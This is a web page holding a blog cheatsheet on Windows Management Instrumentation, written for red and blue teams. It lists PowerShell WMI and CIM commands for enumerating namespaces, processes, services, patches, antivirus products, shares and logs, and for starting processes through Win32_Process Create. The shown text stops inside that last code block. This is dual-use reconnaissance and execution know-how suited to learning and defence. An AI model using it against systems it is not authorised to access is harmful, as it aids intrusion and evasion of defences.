<!doctype html><!-- This site was created with Wowchemy. https://www.wowchemy.com --><!-- Last Published: April 22, 2023 --><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=generator content="Wowchemy 5.7.0 for Hugo"><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap" media=print onload='this.media="all"'><link rel=stylesheet href=/css/vendor-bundle.min.16f785cdb553c8c4431db6775122af35.css media=print onload='this.media="all"'><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/academicons@1.9.2/css/academicons.min.css integrity="sha512-KlJCpRsLf+KKu2VQa5vmRuClRFjxc5lXO03ixZt82HZUk41+1I0bD8KBSA0fY290ayMfWYI9udIqeOWSu1/uZg==" crossorigin=anonymous media=print onload='this.media="all"'><link rel=stylesheet href=/css/wowchemy.8dc57d5311a9840ef9990d497f86c9aa.css><link rel=stylesheet href=/css/libs/chroma/github-light.min.css title=hl-light media=print onload='this.media="all"'><link rel=stylesheet href=/css/libs/chroma/dracula.min.css title=hl-dark media=print onload='this.media="all"' disabled><script async src="https://www.googletagmanager.com/gtag/js?id=G-NNZHY5233M"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}function trackOutboundLink(e,t){gtag("event","click",{event_category:"outbound",event_label:e,transport_type:"beacon",event_callback:function(){t!=="_blank"&&(document.location=e)}}),console.debug("Outbound link clicked: "+e)}function onClickCallback(e){if(e.target.tagName!=="A"||e.target.host===window.location.host)return;trackOutboundLink(e.target,e.target.getAttribute("target"))}gtag("js",new Date),gtag("config","G-NNZHY5233M",{}),gtag("set",{cookie_flags:"SameSite=None;Secure"}),document.addEventListener("click",onClickCallback,!1)</script><meta name=author content="Giovanni Pecoraro"><meta name=description content="Windows Management Instrumentation (WMI) provides a unique interface  to manage a local or remote network or computer and thus can be used by both Red and Blue Teams."><link rel=alternate hreflang=en-us href=https://www.peco602.com/post/0080-wmi-cheatsheet/><link rel=canonical href=https://www.peco602.com/post/0080-wmi-cheatsheet/><link rel=manifest href=/manifest.webmanifest><link rel=icon type=image/png href=/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_32x32_fill_lanczos_center_3.png><link rel=apple-touch-icon type=image/png href=/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_180x180_fill_lanczos_center_3.png><meta name=theme-color content="#3f51b5"><meta property="twitter:card" content="summary_large_image"><meta property="twitter:site" content="@Peco602"><meta property="twitter:creator" content="@Peco602"><meta property="twitter:image" content="https://www.peco602.com/post/0080-wmi-cheatsheet/featured.png"><meta property="og:site_name" content="Giovanni Pecoraro"><meta property="og:url" content="https://www.peco602.com/post/0080-wmi-cheatsheet/"><meta property="og:title" content="Windows Management Instrumentation cheatsheet | Giovanni Pecoraro"><meta property="og:description" content="Windows Management Instrumentation (WMI) provides a unique interface  to manage a local or remote network or computer and thus can be used by both Red and Blue Teams."><meta property="og:image" content="https://www.peco602.com/post/0080-wmi-cheatsheet/featured.png"><meta property="og:locale" content="en-us"><meta property="article:published_time" content="2022-09-29T00:00:00+00:00"><meta property="article:modified_time" content="2022-09-29T00:00:00+00:00"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.peco602.com/post/0080-wmi-cheatsheet/"},"headline":"Windows Management Instrumentation cheatsheet","image":["https://www.peco602.com/post/0080-wmi-cheatsheet/featured.png"],"datePublished":"2022-09-29T00:00:00Z","dateModified":"2022-09-29T00:00:00Z","author":{"@type":"Person","name":"Giovanni Pecoraro"},"publisher":{"@type":"Organization","name":"Giovanni Pecoraro","logo":{"@type":"ImageObject","url":"https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_192x192_fill_lanczos_center_3.png"}},"description":"Windows Management Instrumentation (WMI) provides a unique interface  to manage a local or remote network or computer and thus can be used by both Red and Blue Teams."}</script><title>Windows Management Instrumentation cheatsheet | Giovanni Pecoraro</title></head><body id=top data-spy=scroll data-offset=70 data-target=#TableOfContents class=page-wrapper data-wc-page-id=6af0c0dd63c31a907c3d47c60abaf752><script src=/js/wowchemy-init.min.7532de8e15162845d694f17af8b46a99.js></script><aside class=search-modal id=search><div class=container><section class=search-header><div class="row no-gutters justify-content-between mb-3"><div class=col-6><h1>Search</h1></div><div class="col-6 col-search-close"><a class=js-search href=# aria-label=Close><i class="fas fa-times-circle text-muted" aria-hidden=true></i></a></div></div><div id=search-box><input name=q id=search-query placeholder=Search... autocapitalize=off autocomplete=off autocorrect=off spellcheck=false type=search class=form-control aria-label=Search...></div></section><section class=section-search-results><div id=search-hits></div></section></div></aside><div class="page-header header--fixed"><header><nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id=navbar-main><div class=container-xl><div class="d-none d-lg-inline-flex"><a class=navbar-brand href=/>Giovanni Pecoraro</a></div><button type=button class=navbar-toggler data-toggle=collapse data-target=#navbar-content aria-controls=navbar-content aria-expanded=false aria-label="Toggle navigation">
<span><i class="fas fa-bars"></i></span></button><div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none"><a class=navbar-brand href=/>Giovanni Pecoraro</a></div><div class="navbar-collapse main-menu-item collapse justify-content-start" id=navbar-content><ul class="navbar-nav d-md-inline-flex"><li class=nav-item><a class=nav-link href=/#about><span>Home</span></a></li><li class=nav-item><a class=nav-link href=/#posts><span>Posts</span></a></li><li class=nav-item><a class=nav-link href=/#projects><span>Projects</span></a></li><li class=nav-item><a class=nav-link href=/#talks><span>Talks</span></a></li><li class=nav-item><a class=nav-link href=/#featured><span>Publications</span></a></li><li class=nav-item><a class=nav-link href=/#contact><span>Contact</span></a></li></ul></div><ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2"><li class="nav-item d-none d-lg-inline-flex"><a class=nav-link href=https://twitter.com/Peco602 data-toggle=tooltip data-placement=bottom title="Follow me on Twitter" target=_blank rel=noopener aria-label="Follow me on Twitter"><i class="fab fa-twitter" aria-hidden=true></i></a></li><li class=nav-item><a class="nav-link js-search" href=# aria-label=Search><i class="fas fa-search" aria-hidden=true></i></a></li><li class="nav-item dropdown theme-dropdown"><a href=# class=nav-link data-toggle=dropdown aria-haspopup=true aria-label="Display preferences"><i class="fas fa-moon" aria-hidden=true></i></a><div class=dropdown-menu><a href=# class="dropdown-item js-set-theme-light"><span>Light</span></a>
<a href=# class="dropdown-item js-set-theme-dark"><span>Dark</span></a>
<a href=# class="dropdown-item js-set-theme-auto"><span>Automatic</span></a></div></li></ul></div></nav></header></div><div class=page-body><article class=article><div class="article-container pt-3"><h1>Windows Management Instrumentation cheatsheet</h1><p class=page-subtitle>Windows Management Instrumentation (WMI) provides a unique interface to manage a local or remote network or computer and thus can be used by both Red and Blue Teams.</p><div class=article-metadata><div><span class=author-highlighted>Giovanni Pecoraro</span></div><span class=article-date>Sep 29, 2022</span>
<span class=middot-divider></span>
<span class=article-reading-time>24 min read</span>
<span class=middot-divider></span>
<span class=article-categories><i class="fas fa-folder mr-1"></i><a href=/category/cyber-security/>Cyber Security</a>, <a href=/category/red-teaming/>Red Teaming</a></span></div></div><div class="article-header container featured-image-wrapper mt-4 mb-4" style=max-width:534px;max-height:211px><div style=position:relative><img src=/post/0080-wmi-cheatsheet/featured_hua6ef903a9f3449d4f03fe29e1b771125_6521_1200x2500_fit_q75_h2_lanczos_3.webp width=534 height=211 alt class=featured-image>
<span class=article-header-caption>Image credit: <a href=https://unsplash.com/photos/CpkOjOcXdUY target=_blank rel=noopener><strong>Giovanni Pecoraro</strong></a></span></div></div><div class=article-container><div class=article-style><p>Windows Management Instrumentation (WMI) is Microsoft&rsquo;s implementation of Common Information Model (CIM) and Web-Based Enterprise Management (WBEM). WMI provides a unique interface for applications/scripts to manage a local or remote network or computer.</p><p>WMI can be used for Red/Blue Teaming because:</p><ul><li>it is enabled on all Windows systems by default;</li><li>it really mixes well with existing network traffic;</li><li>it provides execution and persistence with SYSTEM privileges;</li><li>it is often neglected by defenders.</li></ul><p>By default, the WMI service â€“ Winmgmt is running and listening on port 135. DCOM connections are established on port 135, while subsequent data exchanged on port dictated by <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Rpc\Internet â€“ Ports (REG_MULTI_SZ)</code> configurable via <code>DCOMCNFG.exe</code>.</p><h2 id=wmi-basics>WMI Basics</h2><p><figure><div class="d-flex justify-content-center"><div class=w-100><img src=./wmi_architecture.png alt="WMI Architecture" loading=lazy data-zoomable></div></div></figure></p><h3 id=wmi-components>WMI Components</h3><table><thead><tr><th>Component</th><th>Description</th></tr></thead><tbody><tr><td>Managed Objects</td><td>Component being managed by WMI (e.g. process, service, operating system).</td></tr><tr><td>Managed Objects Format (MOF) files</td><td>Used to define WMI namespaces, classes, providers, etc.</td></tr><tr><td>Classes</td><td>Represent items in WMI (e.g. process, hardware, service)</td></tr><tr><td>Repository</td><td>The database used to store the static data (definitions) of classes.</td></tr><tr><td>Namespaces</td><td>Created by providers, they are used to divide classes logically (e.g. root\cimv2, root\default, root\security).</td></tr><tr><td>Providers</td><td>Just like a driver, works as a bridge between a managed object and WMI. They generally exist for every MOF file.</td></tr><tr><td>Consumers</td><td>Applications or scripts which can be used to interact with WMI classes (e.g. powershell, wmic).</td></tr></tbody></table><h3 id=exploring-commands>Exploring commands</h3><h4 id=wmi-commands---powershell-v2>WMI Commands - PowerShell v2</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-Command</span> <span class=n>-CommandType</span> <span class=n>Cmdlet</span> <span class=p>*</span><span class=n>wmi</span><span class=p>*</span> <span class=p>|</span> <span class=nb>select </span><span class=n>name</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WmiMethod</span>
</span></span><span class=line><span class=cl><span class=nb>Register-WmiEvent</span>
</span></span><span class=line><span class=cl><span class=nb>Remove-WmiObject</span>
</span></span><span class=line><span class=cl><span class=nb>Set-WmiInstance</span>
</span></span></code></pre></div><h4 id=cim-commands---powershell-v3>CIM Commands - PowerShell v3</h4><p>CIM commands use WS-MAN so they can be used also against boxes where WMI is blocked but WS-MAN (WinRM) is enabled (even if the target has PowerShell version 2). They can be used also against non-Windows boxes.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-Command</span> <span class=n>-CommandType</span> <span class=n>Cmdlet</span> <span class=p>*</span><span class=n>cim</span><span class=p>*</span> <span class=p>|</span> <span class=nb>select </span><span class=n>name</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Get-CimAssociatedInstance</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimClass</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimSession</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-CimMethod</span>
</span></span><span class=line><span class=cl><span class=nb>New-CimInstance</span>
</span></span><span class=line><span class=cl><span class=nb>New-CimSession</span>
</span></span><span class=line><span class=cl><span class=nb>New-CimSessionOption</span>
</span></span><span class=line><span class=cl><span class=nb>Register-CimIndicationEvent</span>
</span></span><span class=line><span class=cl><span class=nb>Remove-CimInstance</span>
</span></span><span class=line><span class=cl><span class=nb>Remove-CimSession</span>
</span></span><span class=line><span class=cl><span class=nb>Set-CimInstance</span>
</span></span></code></pre></div><h4 id=wmi-and-cim-commands-relations>WMI and CIM commands relations</h4><table><thead><tr><th>WMI</th><th>CIM</th></tr></thead><tbody><tr><td>Get-WmiObject</td><td>Get-CmiInstance</td></tr><tr><td>Get-WmiObject -List</td><td>Get-CmiClass</td></tr><tr><td>Invoke-WmiMethod</td><td>Invoke-CimMethod</td></tr><tr><td>Register-WmiEvent</td><td>Register-CimIndicationEvent</td></tr><tr><td>Remove-WmiObject</td><td>Remove-CimInstance</td></tr><tr><td>Set-WmiInstance</td><td>Set-CimInstance</td></tr></tbody></table><h3 id=exploring-namespaces-within-root-namespace>Exploring namespaces within root namespace</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=s2>&#34;root&#34;</span> <span class=n>-Class</span> <span class=s2>&#34;__Namespace&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=s2>&#34;root&#34;</span> <span class=n>-Class</span> <span class=s2>&#34;__Namespace&#34;</span> <span class=p>|</span> <span class=nb>select </span><span class=n>name</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-Namespace</span> <span class=s2>&#34;root&#34;</span> <span class=n>-Class</span> <span class=s2>&#34;__Namespace&#34;</span> <span class=p>|</span> <span class=nb>select </span><span class=n>name</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Recursively list nested namespaces</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiNamespace</span><span class=p>.</span><span class=py>ps1</span>
</span></span></code></pre></div><h3 id=exploring-classes-and-objects>Exploring classes and objects</h3><p>Once we have a namespace, we can explore its classes. Classes represent items in WMI like process, hardware, service, etc.</p><h4 id=get-classes>Get classes</h4><p>If not specified, root/cim2 is the default namespace. Use <code>-List</code> parameter for <code>Get-WmiObject</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>cimv2</span> <span class=n>-Class</span> <span class=p>*</span><span class=n>bios</span><span class=p>*</span> <span class=n>-List</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=p>*</span><span class=n>bios</span><span class=p>*</span> <span class=n>-List</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-Namespace</span> <span class=n>root</span><span class=p>\</span><span class=n>cimv2</span> <span class=n>-Class</span> <span class=p>*</span><span class=n>bios</span><span class=p>*</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-Class</span> <span class=p>*</span><span class=n>bios</span><span class=p>*</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-QualifierName</span> <span class=n>dynamic</span>
</span></span></code></pre></div><h4 id=get-instances-of-a-class-objects>Get instances of a class (objects)</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_BIOS</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-ClassName</span> <span class=n>Win32_BIOS</span>
</span></span></code></pre></div><h4 id=filtering-objects>Filtering objects</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_Process</span> <span class=n>-Filter</span> <span class=s2>&#34;Name = &#39;explorer.exe&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-ClassName</span> <span class=n>Win32_Process</span> <span class=n>-Filter</span> <span class=s2>&#34;Name = &#39;explorer.exe&#39;&#34;</span> <span class=p>|</span> <span class=nb>fl </span><span class=p>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_Process</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>Name</span> <span class=o>-eq</span> <span class=s2>&#34;explorer.exe&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-ClassName</span> <span class=n>Win32_Process</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>Name</span> <span class=o>-eq</span> <span class=s2>&#34;explorer.exe&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Query</span> <span class=s2>&#34;select * from Win32_Process where Name = &#39;explorer.exe&#39;&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-Query</span> <span class=s2>&#34;select * from Win32_Process where Name = &#39;explorer.exe&#39;&#34;</span>
</span></span></code></pre></div><h3 id=example-of-wmi-usage>Example of WMI usage</h3><p>Get computer name, domain and local groups:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Explore namespaces to find the correct one</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=s2>&#34;root&#34;</span> <span class=n>-Class</span> <span class=s2>&#34;__Namespace&#34;</span> <span class=p>|</span> <span class=nb>select </span><span class=n>name</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-Namespace</span> <span class=s2>&#34;root/cimv2&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Computer name and domain</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-Namespace</span> <span class=s2>&#34;root/cimv2&#34;</span> <span class=n>-ClassName</span> <span class=n>Win32_ComputerSystem</span> <span class=p>|</span> <span class=nb>Format-List</span> <span class=n>-Property</span> <span class=p>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Local groups</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-Namespace</span> <span class=s2>&#34;root/cimv2&#34;</span> <span class=n>-ClassName</span> <span class=n>Win32_Group</span> <span class=p>|</span> <span class=nb>Format-List</span> <span class=n>-Property</span> <span class=p>*</span>
</span></span></code></pre></div><p>List installed software:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-Namespace</span> <span class=s2>&#34;root/cimv2&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-namespace</span> <span class=s2>&#34;root/cimv2&#34;</span> <span class=n>-ClassName</span> <span class=n>Win32_Product</span> <span class=p>|</span> <span class=nb>Format-List</span> <span class=n>-Property</span> <span class=p>*</span>
</span></span></code></pre></div><p>Get installed antivirus:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-Namespace</span> <span class=s2>&#34;root/SecurityCenter2&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-namespace</span> <span class=s2>&#34;root/SecurityCenter2&#34;</span> <span class=n>-ClassName</span> <span class=n>AntiVirusProduct</span> <span class=p>|</span> <span class=nb>Format-List</span> <span class=n>-Property</span> <span class=p>*</span>
</span></span></code></pre></div><p>List files and folders:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-Namespace</span> <span class=s2>&#34;root/cimv2&#34;</span>
</span></span><span class=line><span class=cl><span class=c># Files</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-namespace</span> <span class=s2>&#34;root/cimv2&#34;</span> <span class=n>-ClassName</span> <span class=n>CIM_DataFile</span> <span class=p>|</span> <span class=nb>Format-List</span> <span class=n>-Property</span> <span class=p>*</span>
</span></span><span class=line><span class=cl><span class=c># Shared folders</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-namespace</span> <span class=s2>&#34;root/cimv2&#34;</span> <span class=n>-ClassName</span> <span class=n>Win32_Share</span> <span class=p>|</span> <span class=nb>Format-List</span> <span class=n>-Property</span> <span class=p>*</span>
</span></span><span class=line><span class=cl><span class=c># Local folders</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-namespace</span> <span class=s2>&#34;root/cimv2&#34;</span> <span class=n>-ClassName</span> <span class=n>Win32_Directory</span> <span class=p>|</span> <span class=nb>Format-List</span> <span class=n>-Property</span> <span class=p>*</span>
</span></span></code></pre></div><p>Get security logs:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-Namespace</span> <span class=s2>&#34;root/cimv2&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-namespace</span> <span class=s2>&#34;root/cimv2&#34;</span> <span class=n>-ClassName</span> <span class=n>Win32_NTEventLogFile</span> <span class=p>|</span> <span class=nb>Format-List</span> <span class=n>-Property</span> <span class=p>*</span>
</span></span></code></pre></div><p>Get networking configuration:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-Namespace</span> <span class=s2>&#34;root/cimv2&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-namespace</span> <span class=s2>&#34;root/cimv2&#34;</span> <span class=n>-ClassName</span> <span class=n>Win32_NetworkAdapter</span> <span class=p>|</span> <span class=nb>Format-List</span> <span class=n>-Property</span> <span class=p>*</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-namespace</span> <span class=s2>&#34;root/cimv2&#34;</span> <span class=n>-ClassName</span> <span class=n>Win32_NetworkAdapterConfiguration</span> <span class=p>|</span> <span class=nb>Format-List</span> <span class=n>-Property</span> <span class=p>*</span>
</span></span></code></pre></div><p>List services:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-Namespace</span> <span class=s2>&#34;root/cimv2&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-namespace</span> <span class=s2>&#34;root/cimv2&#34;</span> <span class=n>-ClassName</span> <span class=n>Win32_Service</span>
</span></span></code></pre></div><p>List scheduled tasks:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-Namespace</span> <span class=s2>&#34;root/cimv2&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-namespace</span> <span class=s2>&#34;root/cimv2&#34;</span> <span class=n>-ClassName</span> <span class=n>Win32_ScheduledJob</span>
</span></span></code></pre></div><p>List installed patches:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=s2>&#34;root&#34;</span> <span class=n>-Class</span> <span class=s2>&#34;__Namespace&#34;</span> <span class=p>|</span> <span class=nb>select </span><span class=n>name</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-Namespace</span> <span class=s2>&#34;root/cimv2&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-namespace</span> <span class=s2>&#34;root/cimv2&#34;</span> <span class=n>-ClassName</span> <span class=n>Win32_QuickFixEngineering</span> <span class=p>|</span> <span class=nb>Format-List</span> <span class=n>-Property</span> <span class=p>*</span>
</span></span></code></pre></div><p>List processes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-Namespace</span> <span class=s2>&#34;root/cimv2&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-namespace</span> <span class=s2>&#34;root/cimv2&#34;</span> <span class=n>-ClassName</span> <span class=n>Win32_Process</span> <span class=p>|</span> <span class=nb>Format-List</span> <span class=n>-Property</span> <span class=p>*</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-namespace</span> <span class=s2>&#34;root/cimv2&#34;</span> <span class=n>-ClassName</span> <span class=n>Win32_ProcessStartup</span> <span class=p>|</span> <span class=nb>Format-List</span> <span class=n>-Property</span> <span class=p>*</span>
</span></span></code></pre></div><h3 id=interacting-with-wmi-objects>Interacting with WMI objects</h3><h4 id=removing-objects>Removing objects</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_Process</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>Name</span> <span class=o>-eq</span> <span class=s2>&#34;notepad.exe&#34;</span><span class=p>}</span> <span class=p>|</span> <span class=nb>Remove-WmiObject</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-ClassName</span> <span class=n>Win32_Process</span> <span class=p>|</span> <span class=nb>Where-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>Name</span> <span class=o>-eq</span> <span class=s2>&#34;notepad.exe&#34;</span><span class=p>}</span> <span class=p>|</span> <span class=nb>Remove-CimInstance</span>
</span></span></code></pre></div><h4 id=list-class-methods>List class methods</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_Process</span> <span class=n>-List</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>Methods</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-ClassName</span> <span class=n>Win32_Process</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>CimClassMethods</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-ClassName</span> <span class=n>Win32_Process</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>CimClassMethods</span> <span class=p>|</span> <span class=nb>where </span><span class=n>name</span> <span class=o>-eq</span> <span class=s2>&#34;Create&#34;</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>Parameters</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Get owner for each active process</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nb>Get-CimInstance</span> <span class=n>-ClassName</span> <span class=n>win32_process</span><span class=p>)</span> <span class=p>|</span> <span class=nb>ForEach-Object</span> <span class=p>{</span><span class=nv>$output</span> <span class=p>=</span> <span class=nb>Invoke-CimMethod</span> <span class=n>-InputObject</span> <span class=nv>$_</span> <span class=n>-Name</span> <span class=n>getowner</span><span class=p>;</span> <span class=nb>Write-Host</span> <span class=s2>&#34;PROCESS: &#34;</span><span class=nv>$_</span><span class=p>.</span><span class=n>name</span><span class=s2>&#34; - OWNER: &#34;</span><span class=nv>$output</span><span class=p>.</span><span class=n>user</span><span class=p>}</span>
</span></span></code></pre></div><h4 id=list-classes-which-contains-methods>List classes which contains methods</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=p>*</span> <span class=n>-List</span> <span class=p>|</span> <span class=nb>where-object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=n>Methods</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-MethodName</span> <span class=p>*</span> 
</span></span><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-MethodName</span> <span class=p>*</span><span class=n>create</span><span class=p>*</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># List all methods create in all namespaces namespaces</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=s2>&#34;root&#34;</span> <span class=n>-Class</span> <span class=s2>&#34;__Namespace&#34;</span> <span class=p>|</span> <span class=nb>select </span><span class=n>name</span> <span class=p>|</span> <span class=nb>ForEach-Object</span> <span class=p>{</span><span class=nv>$name</span> <span class=p>=</span> <span class=nv>$_</span><span class=p>.</span><span class=n>name</span><span class=p>;</span> <span class=nb>Get-CimClass</span> <span class=n>-Namespace</span> <span class=s2>&#34;root/</span><span class=nv>$name</span><span class=s2>&#34;</span> <span class=n>-MethodName</span> <span class=n>create</span><span class=p>}</span>
</span></span></code></pre></div><h4 id=invoke-class-methods>Invoke class methods</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Invoke-WmiMethod</span> <span class=n>-Class</span> <span class=n>Win32_Process</span> <span class=n>-Name</span> <span class=n>Create</span> <span class=n>-ArgumentList</span> <span class=vm>@</span><span class=p>(</span><span class=n>calc</span><span class=p>.</span><span class=n>exe</span><span class=p>)</span>
